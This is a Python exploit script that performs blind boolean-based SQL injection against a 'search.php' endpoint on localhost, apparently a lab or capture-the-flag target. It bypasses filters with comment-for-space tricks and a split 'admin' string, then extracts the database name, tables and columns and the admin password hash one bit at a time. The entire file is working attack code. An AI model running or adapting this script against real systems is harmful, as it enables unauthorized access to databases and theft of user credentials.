#!/usr/bin/env python3
import requests
import string
import time

def make_request(payload):
    url = "http://localhost:8080/search.php"
    r = requests.get(url, params={
        'q': payload
    })
    return "Product" in r.text

def extract_string(query):
    result = ""
    for i in range(1, 50):  # Maximum length of 50
        char_bits = ""
        # 8비트를 하나씩 확인
        for bit_pos in range(1, 9):  # 1부터 8까지
            payload = f"%'/**/and/**/(substr(lpad(conv(hex(substr(({query}),{i},1)),16,2),8,0),{bit_pos},1)=1))#"
            if make_request(payload):
                char_bits += "1"
            else:
                char_bits += "0"
        
        # 비트열을 정수로 변환
        char_code = int(char_bits, 2)
        if char_code == 0:  # No more characters
            break
            
        result += chr(char_code)
        print(f"Found character: {result}")
        time.sleep(0.1)
    return result

def get_current_database():
    print("\n[*] Getting current database name...")
    query = "select/**/database()"
    db_name = extract_string(query)
    print(f"[+] Current database: {db_name}")
    return db_name

def get_tables(db_name):
    print("\n[*] Enumerating tables...")
    tables = []
    for i in range(10):  # Assume maximum 10 tables
        query = f"select/**/table_name/**/from/**/information_schema.tables/**/where/**/table_schema='{db_name}'/**/limit/**/{i},1"
        table = extract_string(query)
        if not table:
            break
        tables.append(table)
        print(f"[+] Found table: {table}")
    return tables

def get_columns(db_name, table_name):
    print(f"\n[*] Enumerating columns for table {table_name}...")
    columns = []
    for i in range(10):  # Assume maximum 10 columns per table
        query = f"select/**/column_name/**/from/**/information_schema.columns/**/where/**/table_schema='{db_name}'/**/and/**/table_name='{table_name}'/**/limit/**/{i},1"
        column = extract_string(query)
        if not column:
            break
        columns.append(column)
        print(f"[+] Found column: {column}")
    return columns

def get_admin_hash():
    print("\n[*] Getting admin password hash...")
    query = "select/**/password/**/from/**/users/**/where/**/username='ad'/**/'min'/**/limit/**/1"
    password_hash = extract_string(query)
    print(f"[+] Admin password hash: {password_hash}")
    return password_hash

def enumerate_database():
    print("[*] Starting database enumeration...")
    
    # Get current database name
    db_name = get_current_database()
    
    # Get tables
    tables = get_tables(db_name)
    
    # Get columns for each table
    database_structure = {}
    for table in tables:
        columns = get_columns(db_name, table)
        database_structure[table] = columns
    
    # Print database structure
    print("\n[+] Database Structure:")
    print(f"Database: {db_name}")
    for table, columns in database_structure.items():
        print(f"\nTable: {table}")
        print("Columns:")
        for column in columns:
            print(f"  - {column}")
    
    # Get admin hash
    admin_hash = get_admin_hash()
    
    return database_structure, admin_hash

if __name__ == "__main__":
    enumerate_database() 